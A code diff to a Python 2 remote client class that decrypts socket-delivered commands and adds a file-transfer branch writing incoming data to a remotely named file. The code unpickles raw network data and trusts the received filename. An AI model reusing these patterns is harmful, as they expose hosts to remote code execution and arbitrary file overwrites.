@@ -49,29 +49,37 @@ class Remoteclient:
     def Operations(self):
         
         self.exchangeKeys()
-        print "receiving data"
         while True:
-            print "inside operations"
             cmd=PKCS1_OAEP.new(self.RSAKey).decrypt((b64decode(pickle.loads(self.sock.recv(4096)))))
             cmd=cmd.strip('~')
-            print cmd
+            print "CMDD PRINT DATA"+cmd
             if cmd=="FT":
                 print "inside FT"
-                print self.receiveData()
+                rdata=""
+                filename= self.receiveData()
+                print filename
+                while True:
+                    buf=(self.receiveData()).strip('~')
+                    if buf=="QUIT":
+                        break
+                    else:
+                        rdata+=buf
+                with open(filename,'wb') as f:
+                    f.write(rdata)
             elif cmd=="EFS":
                 print "inside EFS"
-                print self.receiveData()
+                print "EFS PRINT DATA"+self.receiveData()
                 self.sendData("Send EFS Key")
                 self.sendData('QUIT')
             elif cmd=="CMD":
                 print "inside CMD"
-                print self.receiveData()
+                print "CMD PRINT DATA"+self.receiveData()
             elif cmd=="SCP":
                 print "Inside SCP"
-                print self.receiveData()
+                print "SCP PRINT DATA"+self.receiveData()
             else:
                 print "inside else block"
-                print self.receiveData()
+                print "ELSE PRINT DATA"+self.receiveData()
             
     def receiveData(self):
         while 1:
